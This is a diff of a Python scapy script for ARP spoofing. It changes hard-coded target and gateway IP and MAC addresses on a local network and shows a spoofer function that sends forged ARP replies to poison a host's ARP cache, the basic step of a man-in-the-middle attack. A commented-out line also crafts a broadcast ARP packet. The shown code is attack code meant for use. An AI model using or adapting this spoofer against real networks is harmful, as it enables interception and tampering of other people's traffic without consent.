@@ -3,15 +3,15 @@ import time
 import argparse
 import sys
 
-targetIP="192.168.200.240"
-target_mac="D0:27:88:73:F3:44"
-gatewayIP="192.168.200.1"
-gateway_mac="e8:1c:ba:32:48:fb"
+targetIP="192.168.0.56"
+target_mac="20:34:FB:56:B9:F7"
+gatewayIP="192.168.0.1"
+gateway_mac="00:ad:24:f6:18:2a"
 
 def spoofer(targetIP, spoofIP,mac):
     packet=scapy.ARP(op=2,pdst=targetIP,hwdst=mac,psrc=spoofIP)
-    # resp=scapy.sr1(packet, verbose=True,timeout=1)
-    resp=scapy.send(packet, verbose=True)
+    resp=scapy.sr1(packet, verbose=True,timeout=1)
+    # resp=scapy.send(packet, verbose=True)
     print(repr(resp))
     # sendp(Ether(dst="ff:ff:ff:ff:ff:ff",src="00:11:22:aa:bb:cc")/ARP(hwsrc="00:11:22:aa:bb:cc",pdst="172.16.20.1"))
 
